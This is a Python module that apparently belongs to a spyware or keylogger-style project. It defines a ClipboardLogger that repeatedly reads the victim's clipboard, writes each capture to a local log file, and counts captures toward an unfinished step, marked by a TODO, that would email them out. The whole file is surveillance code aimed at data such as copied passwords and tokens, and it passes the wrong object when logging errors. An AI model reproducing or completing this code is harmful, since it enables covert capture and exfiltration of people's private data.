from pyperclip import paste
from time import sleep
from os.path import join
import sys
from utils.utils import log, handle_counter
from config import LOGS_DIRECTORY_PATH, CLIPBOARD_INTERVAL, PASTES_PER_EMAIL


class ClipboardLogger:
    def __init__(self):
        self.log_file_path = (
            join(LOGS_DIRECTORY_PATH, "clipboard.txt")
            if LOGS_DIRECTORY_PATH
            else "clipboard.txt"
        )
        self.error_file_path = (
            join(LOGS_DIRECTORY_PATH, "errors.txt")
            if LOGS_DIRECTORY_PATH
            else "errors.txt"
        )
        self.counter = 0
        self.counter_max = PASTES_PER_EMAIL
        self.interval = CLIPBOARD_INTERVAL
        self.running = True

    def log_clipboard(self) -> None:
        data = paste().replace("\n", r"\n")
        log(data, self.log_file_path)

    def handle_counter(self):
        self.counter += 1
        if handle_counter(self.counter, self.counter_max):
            pass # TODO: Email logic

    def run(self):
        try:
            while self.running:
                self.log_clipboard()
                self.handle_counter()
                sleep(self.interval)
        except KeyboardInterrupt:
            self.running = False
        except Exception as e:
            self.running = False
            self.log_error("ERROR WHILE LOGGING CLIPBOARD:", Exception)

    def log_error(self, message: str, exception: Exception) -> None:
        log(message, self.error_file_path)
        log(str(exception), self.error_file_path)


def main():
    clipboard_logger = ClipboardLogger()
    try:
        clipboard_logger.run()
    except Exception:
        print("An error occurred while logging clipboard.")
        print(f"See full error here: {clipboard_logger.error_file_path}")
        return 1

    return 0


if __name__ == "__main__":
    sys.exit(main())
